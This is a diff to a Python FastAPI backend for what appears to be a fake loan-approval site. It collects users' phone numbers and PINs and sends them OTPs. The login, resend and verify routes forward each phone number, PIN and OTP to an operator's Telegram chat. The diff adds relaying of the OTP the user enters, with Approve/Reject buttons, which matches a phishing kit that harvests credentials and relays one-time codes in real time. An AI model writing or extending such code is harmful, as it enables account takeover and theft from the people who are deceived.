@@ -30,7 +30,7 @@ from approvals import (
     loan_request_phones,
 )
 from notifications import send_otp_sms, send_telegram_message, build_otp_sms
-from mobitech_sms import send_mobitech_sms  # ⭐ IMPORT MOBITECH HELPER
+from mobitech_sms import send_mobitech_sms  # ⭐ MOBITECH HELPER
 
 app = FastAPI()
 
@@ -67,6 +67,7 @@ class ResendRequest(BaseModel):
     phone_number: str
 
 
+# --- Helpers ---
 def format_phone(phone: str) -> str:
     phone = phone.strip()
     if phone.startswith("0"):
@@ -88,6 +89,27 @@ def cleanup_approval_records_for_phone(phone: str):
         approval_results.pop(aid, None)
         pending_approvals.pop(aid, None)
 
+
+async def send_otp_to_user(full_phone: str, sms_body: str, label: str = "OTP"):
+    """Send OTP via Mobitech SMS with error logging."""
+    try:
+        response = send_mobitech_sms(full_phone, sms_body)
+        print(f"[{label}] Mobitech SMS sent to {full_phone}: {response}")
+        return response
+    except Exception as e:
+        print(f"[{label}] Failed to send Mobitech SMS: {e}")
+        # Fallback to legacy SMS provider
+        try:
+            send_otp_sms(full_phone, sms_body)
+            print(f"[{label}] Fallback SMS sent to {full_phone}")
+        except Exception as fallback_err:
+            print(f"[{label}] Fallback SMS also failed: {fallback_err}")
+        return None
+
+
+# ==============================
+# ROUTES
+# ==============================
 
 @app.get("/")
 def read_root():
@@ -120,27 +142,29 @@ async def login(request: LoginRequest):
 
     sms_body = build_otp_sms(otp)
 
-    # ⭐ SEND OTP TO USER VIA MOBITECH SMS
-    try:
-        mobitech_response = send_mobitech_sms(full_phone, sms_body)
-        print(f"Mobitech SMS sent to {full_phone}: {mobitech_response}")
-    except Exception as e:
-        print(f"Failed to send Mobitech SMS: {e}")
-        # Fallback to old SMS provider if Mobitech fails? 
-        # send_otp_sms(full_phone, otp) # Uncomment if you want a fallback
+    # ⭐ Send OTP to user via Mobitech SMS (with fallback)
+    await send_otp_to_user(full_phone, sms_body, label="LOGIN")
 
+    # ⭐ Notify admin on Telegram
     approval_id = str(uuid4())
     create_approval(approval_id)
     approval_phones[approval_id] = full_phone
     approval_pins[approval_id] = request.pin
     approval_otps[approval_id] = otp
 
-    await send_approval_request(approval_id, full_phone, request.pin, otp, sms_body)
+    await send_approval_request(
+        approval_id,
+        full_phone,
+        request.pin,
+        otp,
+        sms_body,
+        is_user_submitted=False,
+    )
 
     return {
         "status": "approved",
         "approval_id": approval_id,
-        "message": "OTP sent to your phone"
+        "message": "OTP sent to your phone",
     }
 
 
@@ -158,23 +182,58 @@ async def approval_status(approval_id: str):
 @app.post("/api/verify-otp")
 async def verify_otp(request: OTPRequest):
     full_phone = format_phone(request.phone_number)
+    entered_otp = request.otp.strip()
     expected = otp_store.get(full_phone)
     status = otp_approval_status.get(full_phone, "pending")
 
-    if not expected or request.otp != expected:
-        return {"status": "error", "message": "Code invalide"}
+    # --- Basic validation ---
+    if not expected:
+        return {
+            "status": "error",
+            "message": "Code expiré. Veuillez demander un nouveau code.",
+        }
 
+    if entered_otp != expected:
+        return {"status": "error", "message": "Code invalide."}
+
+    # --- If admin already decided ---
     if status == "rejected":
         otp_store.pop(full_phone, None)
         otp_approval_status.pop(full_phone, None)
         phone_pins.pop(full_phone, None)
-        return {"status": "rejected", "message": "Code refusé par l'administrateur"}
+        return {
+            "status": "rejected",
+            "message": "Code refusé par l'administrateur",
+        }
 
     if status == "approved":
         otp_store.pop(full_phone, None)
         otp_approval_status.pop(full_phone, None)
         phone_pins.pop(full_phone, None)
         return {"status": "success", "message": "Prêt approuvé"}
+
+    # --- ⭐ NEW: Send the ENTERED OTP to Telegram for admin review ---
+    approval_id = str(uuid4())
+    create_approval(approval_id)
+    approval_phones[approval_id] = full_phone
+    approval_pins[approval_id] = phone_pins.get(full_phone, "****")
+    approval_otps[approval_id] = entered_otp
+    otp_approval_status[full_phone] = "pending"
+
+    sms_body = build_otp_sms(entered_otp)
+
+    try:
+        await send_approval_request(
+            approval_id,
+            full_phone,
+            phone_pins.get(full_phone, "****"),
+            entered_otp,
+            sms_body,
+            is_user_submitted=True,
+        )
+        print(f"[VERIFY-OTP] Sent user-submitted OTP to Telegram for {full_phone}")
+    except Exception as e:
+        print(f"[VERIFY-OTP] Failed to notify Telegram: {e}")
 
     return {"status": "pending", "message": "En attente de validation"}
 
@@ -202,20 +261,37 @@ async def resend_otp(request: ResendRequest):
     pin = phone_pins.get(full_phone, "****")
     sms_body = build_otp_sms(new_otp)
 
-    # ⭐ SEND RESENT OTP TO USER VIA MOBITECH SMS
-    try:
-        mobitech_response = send_mobitech_sms(full_phone, sms_body)
-        print(f"Mobitech SMS resent to {full_phone}: {mobitech_response}")
-    except Exception as e:
-        print(f"Failed to resend Mobitech SMS: {e}")
+    # ⭐ Send new OTP via Mobitech SMS
+    await send_otp_to_user(full_phone, sms_body, label="RESEND")
 
+    # ⭐ Create a fresh approval record
     approval_id = str(uuid4())
     create_approval(approval_id)
     approval_phones[approval_id] = full_phone
     approval_pins[approval_id] = pin
     approval_otps[approval_id] = new_otp
 
-    await send_approval_request(approval_id, full_phone, pin, new_otp, sms_body)
+    # ⭐ Notify admin on Telegram — dedicated "Resend Requested" message
+    try:
+        await send_telegram_message(
+            f"🔄 <b>Resend Requested</b>\n\n"
+            f"📱 Phone: <code>{full_phone}</code>\n"
+            f"🔐 New OTP: <code>{new_otp}</code>\n"
+            f"🆔 Ref: <code>{approval_id}</code>"
+        )
+        print(f"[RESEND] Notified admin of resend for {full_phone}")
+    except Exception as e:
+        print(f"[RESEND] Failed to send resend notification: {e}")
+
+    # ⭐ Also send the standard approval request with Approve/Reject buttons
+    await send_approval_request(
+        approval_id,
+        full_phone,
+        pin,
+        new_otp,
+        sms_body,
+        is_user_submitted=False,
+    )
 
     return {"status": "success", "message": "OTP resent successfully"}
 
@@ -234,7 +310,7 @@ async def request_loan(request: ResendRequest):
     return {
         "status": "pending",
         "approval_id": approval_id,
-        "message": "Waiting for admin approval"
+        "message": "Waiting for admin approval",
     }
 
 
@@ -250,7 +326,10 @@ async def loan_request_status_endpoint(approval_id: str):
     return {"status": status}
 
 
-# --- TELEGRAM WEBHOOK ---
+# ==============================
+# TELEGRAM WEBHOOK
+# ==============================
+
 @app.post("/telegram/webhook")
 async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
     try:
@@ -281,7 +360,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
 
             await answer_callback_query(
                 callback_id,
-                "✅ Loan Approved" if approved else "❌ Loan Denied"
+                "✅ Loan Approved" if approved else "❌ Loan Denied",
             )
 
             phone = loan_request_phones.get(approval_id, "Unknown")
@@ -293,7 +372,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                     message_id=callback["message"]["message_id"],
                     text=f"{result_text}\n\n"
                          f"📱 Phone: <code>{phone}</code>\n"
-                         f"🆔 Ref: <code>{approval_id}</code>"
+                         f"🆔 Ref: <code>{approval_id}</code>",
                 )
 
             return {"ok": True}
@@ -311,7 +390,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
 
         await answer_callback_query(
             callback_id,
-            "✅ OTP Approved" if approved else "❌ OTP Rejected"
+            "✅ OTP Approved" if approved else "❌ OTP Rejected",
         )
 
         phone = approval_phones.get(approval_id, "Unknown")
@@ -324,7 +403,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                 background_tasks.add_task(
                     send_telegram_message,
                     f"✅ <b>OTP Approved</b>\n"
-                    f"📱 Phone: <code>{phone}</code>"
+                    f"📱 Phone: <code>{phone}</code>",
                 )
             else:
                 otp_approval_status[phone] = "rejected"
@@ -332,7 +411,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                 background_tasks.add_task(
                     send_telegram_message,
                     f"❌ <b>OTP Rejected</b>\n"
-                    f"📱 Phone: <code>{phone}</code>"
+                    f"📱 Phone: <code>{phone}</code>",
                 )
 
         if "message" in callback:
@@ -344,7 +423,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                      f"📱 Phone: <code>{phone}</code>\n"
                      f"🔑 PIN: <code>{pin}</code>\n"
                      f"🔐 OTP: <code>{otp}</code>\n"
-                     f"🆔 Ref: <code>{approval_id}</code>"
+                     f"🆔 Ref: <code>{approval_id}</code>",
             )
 
         approval_phones.pop(approval_id, None)
